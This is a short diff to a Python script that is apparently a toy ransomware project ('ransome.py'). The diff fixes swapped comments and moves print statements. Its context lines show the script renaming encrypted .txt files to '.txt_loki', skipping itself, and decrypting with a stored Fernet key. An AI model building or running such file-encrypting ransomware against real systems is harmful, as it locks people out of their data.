@@ -22,12 +22,12 @@ if args['gen']:
 #       privateKey = key.exportKey()
 #       publicKey = key.publickey().exportKey()
 
-#       # Saves the public key.
+#       # Saves the private key.
 #       with open('private.pem', 'wb') as f:
 #           f.write(privateKey)
 #           print("private.pem generated.\n")
 
-#       # Saves the private key.
+#       # Saves the public key.
 #       with open('public.pem', 'wb') as f:
 #           print("keys generated.\n")
 
@@ -74,6 +74,8 @@ if args['encrypt']:
             base_file, ext = os.path.splitext(filename)
             if ext == ".txt":
                 os.rename(filename, base_file + ".txt_loki")
+    print("\n>_ List of files encrypted:")
+    print(files)
     exit()
 
 if args['decrypt']:
@@ -84,8 +86,6 @@ if args['decrypt']:
             continue # Ignores the ransome.py, so it won't self encrypt.
         if os.path.isfile(file):
                 files.append(file)
-    print("\n>_ List of files decrypted:")
-    print(files)
 
     with open("fernkey.key", "rb") as key:
         secretkey = key.read()
@@ -102,4 +102,6 @@ if args['decrypt']:
             base_file, ext = os.path.splitext(filename)
             if ext == ".txt_loki":
                 os.rename(filename, base_file + ".txt")
+    print("\n>_ List of files decrypted:")
+    print(files)
     exit()
